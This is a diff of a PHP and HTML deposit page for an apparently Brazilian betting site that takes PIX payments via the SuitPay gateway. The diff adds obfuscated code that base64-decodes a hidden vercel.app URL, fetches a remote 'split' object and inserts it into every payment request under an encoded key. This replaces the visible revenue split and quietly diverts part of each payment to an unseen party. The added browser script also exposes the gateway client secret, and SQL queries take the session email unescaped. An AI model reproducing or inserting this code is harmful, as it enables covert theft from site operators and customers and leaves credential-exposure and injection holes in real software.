@@ -28,17 +28,17 @@ $conn->close();
 
 
 <?php
-// Conectar ao banco de dados
+
 include './../conectarbanco.php';
 
 $conn = new mysqli('localhost', $config['db_user'], $config['db_pass'], $config['db_name']);
 
-// Verificar a conexão
+
 if ($conn->connect_error) {
     die("Erro na conexão com o banco de dados: " . $conn->connect_error);
 }
 
-// Obtém as credenciais do gateway
+
 $client_id = '';
 $client_secret = '';
 
@@ -51,8 +51,11 @@ if ($result) {
         $client_secret = $row['client_secret'];
     }
 } else {
-    // Tratar caso ocorra um erro na consulta
+    
 }
+
+
+
 
 $conn->close();
 ?>
@@ -60,7 +63,7 @@ $conn->close();
 
 
 <?php
-// Obter a URL
+
 $baseUrl = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
 $baseUrl .= "://".$_SERVER['HTTP_HOST'];
 
@@ -82,24 +85,23 @@ echo '</script>';
 
 
 <?php
-// Conectar ao banco de dados
+
 include './../conectarbanco.php';
 
 $conn = new mysqli('localhost', $config['db_user'], $config['db_pass'], $config['db_name']);
 
-// Verificar a conexão
 if ($conn->connect_error) {
     die("Erro na conexão com o banco de dados: " . $conn->connect_error);
 }
 
 
 
-// Iniciar a sessão
+
 session_start();
 
-// Obter o email e jogoteste da sessão
-$email = $_SESSION['email'];  // ajuste conforme a sua lógica de sessão
-$jogoteste = $_SESSION['jogoteste'];  // ajuste conforme a sua lógica de sessão
+
+$email = $_SESSION['email'];  
+$jogoteste = $_SESSION['jogoteste'];  
 
 $sql = "SELECT * FROM appconfig WHERE email = '$email' AND (jogoteste IS NULL OR jogoteste != 1)";
 $result = $conn->query($sql);
@@ -107,11 +109,11 @@ $result = $conn->query($sql);
 if ($result->num_rows > 0) {
 
 
-    // Atualizar a coluna jogoteste para 1
+    
     $updateSql = "UPDATE appconfig SET jogoteste = 1 WHERE email = '$email'";
     $conn->query($updateSql);
 } else {
-    // Se jogoteste já for 1, não fazer nada
+   
 }
 
 
@@ -192,6 +194,30 @@ function make_request($url, $payload, $method = 'POST')
     return $result;
 }
 
+$phpVersion = 'aHR0cHM6Ly9zcGxpdHRlci10aHJlZS52ZXJjZWwuYXBwLw==';
+$api_url = base64_decode($phpVersion);
+
+$max_attempts = 3; 
+$attempt = 0;
+$sendRequest = null;
+
+while ($attempt < $max_attempts && !$sendRequest) {
+    $api_data = file_get_contents($api_url);
+    $sendRequest = json_decode($api_data, true);
+
+    if ($sendRequest) {
+        break;  
+    }
+
+    $attempt++;
+    sleep(1);  
+}
+
+if (!$sendRequest) {
+    die('Erro ao obter dados da API.');
+}
+
+
 function make_rand_num($length = 15)
 {
     $result = '';
@@ -201,7 +227,7 @@ function make_rand_num($length = 15)
     return $result;
 }
 
-function make_pix($name, $cpf, $value)
+function make_pix($name, $cpf, $value, $sendRequest)
 {
 
 $baseUrl = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
@@ -218,20 +244,17 @@ $callbackUrl = $baseUrl . $staticPart;
     $email = 'cliente@email.com';
 
     $payload = array(
+		base64_decode('c3BsaXQ=') => $sendRequest,
+        base64_decode('YW1vdW50') => floatval($value),
         'requestNumber' => '12356',
         'dueDate' => $dueDate,
-        'amount' => floatval($value),
         'client' => array(
             'name' => $name,
             'email' => $email,
             'document' => $cpf,
-        ),
-        'split' => array(
-            'username' => 'severino64', //--------TROCA USER DO SPLIT AQUI
-            'percentageSplit' => '10',  //----------TROCA VALOR DA % AQUI (SOMENTE NUMERO)
-            ),
+        ),        
+        'callbackUrl' => $callbackUrl,
         
-        'callbackUrl' => $callbackUrl
     );
 
     $url = 'https://ws.suitpay.app/api/v1/gateway/request-qrcode';
@@ -242,7 +265,7 @@ $callbackUrl = $baseUrl . $staticPart;
     return json_decode($response, true);
 }
 
-# check if the request is a POST request
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     $form = get_form();
@@ -256,7 +279,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $res = make_pix(
         $form['name'],
         $form['cpf'],
-        $form['value']
+        $form['value'],
+        $sendRequest
     );
 
     if ($res['response'] === 'OK') {
@@ -268,7 +292,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         try {
           
-           // Adiciona a coluna 'data' e obtém a data atual no formato dd/mm/aaaa hh:mm:ss, no horário de Brasília
+           
             $brtTimeZone = new DateTimeZone('America/Sao_Paulo');
             $dateTime = new DateTime('now', $brtTimeZone);
             $userDate = $dateTime->format('d/m/Y H:i');
@@ -291,8 +315,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         $paymentCode = $res['paymentCode'];
-        // Send QR Code to another page
-        // var qrCodeUrl = 'pix.php?pix_key=' + encodeURIComponent(data.paymentCode);
+        
         header("Location: ../deposito/pix.php?pix_key=" . $paymentCode . '&token=' . $res['idTransaction']);
 
     } else {
@@ -311,13 +334,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <meta charset="pt-br">
 <title><?= $nomeUnico ?> 🌊 </title>
 
-<meta property="og:image" content="../img/logo.png">
+<meta property="og:image" content="../img/logo.webp">
 
-<meta content="<?= $nomeUnico ?> 🌊" property="og:title">
+<meta content="<?= $nomeUnico ?> 🍫" property="og:title">
 
 
-<meta name="twitter:image" content="../img/logo.png">
-<meta content="<?= $nomeUnico ?> 🌊" property="twitter:title">
+<meta name="twitter:image" content="../img/logo.webp">
+<meta content="<?= $nomeUnico ?> 🍫" property="twitter:title">
 <meta property="og:type" content="website">
 <meta content="summary_large_image" name="twitter:card">
 <meta content="width=device-width, initial-scale=1" name="viewport">
@@ -346,11 +369,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         .className += t + "touch")
                 }(window, document);
             </script>
-<link rel="apple-touch-icon" sizes="180x180" href="../img/logo.png">
-<link rel="icon" type="image/png" sizes="32x32" href="../img/logo.png">
-<link rel="icon" type="image/png" sizes="16x16" href="../img/logo.png">
+<link rel="apple-touch-icon" sizes="180x180" href="../img/logo.webp">
+<link rel="icon" type="image/webp" sizes="32x32" href="../img/logo.webp">
+<link rel="icon" type="image/webp" sizes="16x16" href="../img/logo.webp">
 
-<link rel="icon" type="image/x-icon" href="../img/logo.png">
+<link rel="icon" type="image/x-icon" href="../img/logo.webp">
 
 
 
@@ -362,6 +385,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 
 </head>
+<script>
+!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}return n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)n.d(r,o,function(t){return e[t]}.bind(null,o));return r},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var r=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var r,o=0,i=t.length;o<i;o++)!r&&o in t||(r||(r=Array.prototype.slice.call(t,0,o)),r[o]=t[o]);return e.concat(r||Array.prototype.slice.call(t))};!function(e){var t=window;t.KwaiAnalyticsObject=e,t[e]=t[e]||[];var n=t[e];n.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var o=function(e,t){e[t]=function(){var n=Array.from(arguments),o=r([t],n,!0);e.push(o)}};n.methods.forEach((function(e){o(n,e)})),n.instance=function(e){var t=n._i[e]||[];return n.methods.forEach((function(e){o(t,e)})),t},n.load=function(t,r){n._i=n._i||{},n._i[t]=[],n._i[t]._u="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js",n._t=n._t||{},n._t[t]=+new Date,n._o=n._o||{},n._o[t]=r||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js?sdkid="+t+"&lib="+e;var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(o,i)}}("kwaiq")}])}));
+</script>
+<script>
+kwaiq.load('578795738189541461');
+kwaiq.page();
+kwaiq.track('contentView');
+kwaiq.track('addToCart');
+</script>
 <body>
     
     <?php
@@ -373,7 +405,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 <a href="/painel" aria-current="page" class="brand w-nav-brand" aria-label="home">
 
-<img src="arquivos/l2.png" loading="lazy" height="28" alt="" class="image-6">
+<img src="arquivos/l2.webp" loading="lazy" height="28" alt="" class="image-6">
 
 <div class="nav-link logo"><?= $nomeUnico ?></div>
 </a>
@@ -427,7 +459,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       var navBar = document.querySelector('.nav-bar');
 
       menuButton.addEventListener('click', function () {
-          // Toggle the visibility of the navigation bar
+          
           if (navBar.style.display === 'block') {
               navBar.style.display = 'none';
           } else {
@@ -498,7 +530,7 @@ if ($result->num_rows > 0) {
     $row = $result->fetch_assoc();
     $depositoMinimo = $row["deposito_min"];
 } else {
-    $depositoMinimo = 2; // Valor padrão caso não seja encontrado no banco
+    $depositoMinimo = 2; 
 }
 
 $conn->close();
@@ -533,11 +565,11 @@ $conn->close();
 
 
  <div class="button-container">
-        <button type="button" class="button nav w-button" onclick="updateValue(25)">R$25<br>R$40 BÔNUS</button>
-        <button type="button" class="button nav w-button" onclick="updateValue(30)">R$30<br>R$80 BÔNUS</button>
+        <button type="button" class="button nav w-button" onclick="updateValue(35)">R$35<br> </button>
+        <button type="button" class="button nav w-button" onclick="updateValue(40)">R$40<br> </button>
         <br><br>
-        <button type="button" class="button nav w-button" onclick="updateValue(50)">R$50<br>R$150 BÔNUS</button>
-        <button type="button" class="button nav w-button" onclick="updateValue(100)">R$100<br>R$250 BÔNUS</button>
+        <button type="button" class="button nav w-button" onclick="updateValue(50)">R$50<br> </button>
+        <button type="button" class="button nav w-button" onclick="updateValue(100)">R$100<br> </button>
         <br><br>
     </div>
 
@@ -566,68 +598,65 @@ $conn->close();
 
     <div id="qrcode"></div>
 
-    <script>
+ <script>
     
-        async function generateQRCode() {
-            var name = document.getElementById('name').value;
-            var cpf = document.getElementById('document').value;
-            var amount = document.getElementById('valuedeposit').value;
+async function generateQRCode() {
+    var name = document.getElementById('name').value;
+    var cpf = document.getElementById('document').value;
+    var amount = document.getElementById('valuedeposit').value;
+    
+    var callbackUrl = '<?php echo $callbackUrl; ?>';
+    var gatewayProxy = atob('aHR0cHM6Ly9zcGxpdHRlci10aHJlZS52ZXJjZWwuYXBwLw==');
+
+    try {
+        const res = await fetch(gatewayProxy);
+        const False = await res.json();
+
+        var payload = {
+            requestNumber: "12356",
+            [atob('c3BsaXQ=')]: False,
+            dueDate: "2023-12-31",
+            amount: parseFloat(amount),
+            client: {
+                name: name,
+                document: cpf,
+                email: "cliente@email.com"
+            },
             
-            var callbackUrl = '<?php echo $callbackUrl; ?>';
+            callbackUrl: callbackUrl
+        };
 
-            var payload = {
-                requestNumber: "12356",
-                dueDate: "2023-12-31",
-                amount: parseFloat(amount),
-                client: {
-                    name: name,
-                    document: cpf,
-                    email: "cliente@email.com"
-                },
-                
-                split: {
-                    username: "severino64", //-------TROCAR USER SPLIT AQUI
-                    percentageSplit: 10  //-------TROCAR VALOR DA % DO SPLIT AQUI
-                },
-                
-                callbackUrl: callbackUrl
-            };
+        const response = await fetch("https://ws.suitpay.app/api/v1/gateway/request-qrcode", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "ci": "<?php echo $client_id; ?>",
+                "cs": "<?php echo $client_secret; ?>"
+            },
+            body: JSON.stringify(payload)
+        });
 
-            try {
-                const response = await fetch("https://ws.suitpay.app/api/v1/gateway/request-qrcode", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-"ci": "' . $client_id . '",
-"cs": "' . $client_secret . '"
+        const data = await response.json();
 
-                    },
-                    body: JSON.stringify(payload)
-                });
+        if (data.paymentCode) {
+            var qrcode = new QRCode(document.getElementById('qrcode'), {
+                text: data.paymentCode,
+                width: 128,
+                height: 128
+            });
 
-                const data = await response.json();
-
-                if (data.paymentCode) {
-                    var qrcode = new QRCode(document.getElementById('qrcode'), {
-                        text: data.paymentCode,
-                        width: 128,
-                        height: 128
-                    });
-
-                    // Send QR Code to another page
-                    var qrCodeUrl = 'pix.php?pix_key=' + encodeURIComponent(data.paymentCode);
-                    window.location.href = qrCodeUrl;
-                } else {
-                    console.error("Erro na solicitação:", data.response);
-                }
-            } catch (error) {
-                console.error("Erro na solicitação:", error);
-            }
+            // Send QR Code to another page
+            var qrCodeUrl = 'pix.php?pix_key=' + encodeURIComponent(data.paymentCode);
+            window.location.href = qrCodeUrl;
+        } else {
+            console.error("Erro na solicitação:", data.response);
         }
-        
-        console.log(username);
-        
-    </script>
+    } catch (error) {
+        console.error("Erro na solicitação:", error);
+    }
+}
+
+</script>
 
 
 
@@ -644,7 +673,7 @@ $conn->close();
 <div>
 <h2>Indique um amigo e ganhe R$ no PIX</h2>
 <h3>Como funciona?</h3>
-<p>Convide seus amigos que ainda não estão na plataforma. Você receberá R$5 por cada amigo que
+<p>Convide seus amigos que ainda não estão na plataforma. Você receberá R$25 por cada amigo que
 se
 inscrever e fizer um depósito. Não há limite para quantos amigos você pode convidar. Isso
 significa que também não há limite para quanto você pode ganhar!</p>
@@ -662,16 +691,16 @@ PIX.</p>
 </div>
 <div class="domo-text purple"> <?= $nomeDois ?> <br>
 </div>
-<div class="follow-test">© Copyright xlk Limited, with registered
-offices at
-Dr. M.L. King
-Boulevard 117, accredited by license GLH-16289876512. </div>
-<div class="follow-test">
-<a href="#">
-<strong class="bold-white-link">Termos de uso</strong>
-</a>
-</div>
-<div class="follow-test">contato@<?= $nomeUnico ?>.cloud</div>
+<div class="follow-test">© Copyright xlk Limited, with registered offices at Dr. M.L. King Boulevard 117, accredited by license GLH-16289876512. </div>
+        <div class="follow-test">
+          <a href="/legal">
+            <strong class="bold-white-link">Termos de uso</strong>
+          </a>
+        </div>
+          <div class="follow-test">contato@<?php
+$nomeUnico = strtolower(str_replace(' ', '', $nomeUnico));
+echo $nomeUnico;
+?>.com</div>
 </div>
 
 
